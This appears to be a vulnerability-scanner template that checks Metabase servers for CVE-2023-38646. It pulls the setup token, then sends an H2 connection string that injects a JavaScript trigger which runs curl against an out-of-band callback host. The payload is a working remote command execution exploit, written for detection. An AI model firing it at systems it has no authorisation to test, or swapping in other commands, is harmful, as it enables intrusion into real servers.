id: cve-2023-38646-metabase-validate-rce
info:
  name: Metabase Validate Remote Command Execution (CVE-2023-38646)
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    This template detects the Metabase Validate Remote Code Execution vulnerability (CVE-2023-38646) by leveraging the setup-token and triggering DNS-based out-of-band interaction.
  tags: rce,cve,CVE-2023-38646,dns,oob

variables:
  reverse: '{{interactsh-url}}'

flow: http(1) && http(2)

http:
  - id: fetch-setup-token
    method: GET
    path:
      - "{{BaseURL}}/api/session/properties"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "setup-token"
    extractors:
      - type: regex
        name: token
        group: 1
        regex:
          - '\"setup-token\":\"(.*?)\"'
        internal: true

  - id: validate-setup
    method: POST
    path:
      - "{{BaseURL}}/api/setup/validate"
    headers:
      Content-Type: application/json
    body: |
      {
          "token": "{{token}}",
          "details":
          {
              "is_on_demand": false,
              "is_full_sync": false,
              "is_sample": false,
              "cache_ttl": null,
              "refingerprint": false,
              "auto_run_queries": true,
              "schedules": {},
              "details":
              {
                  "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('curl {{reverse}}')\n$$--=x",
                  "advanced-options": false,
                  "ssl": true
              },
              "name": "an-sec-research-team",
              "engine": "h2"
          }
      }
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 400
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
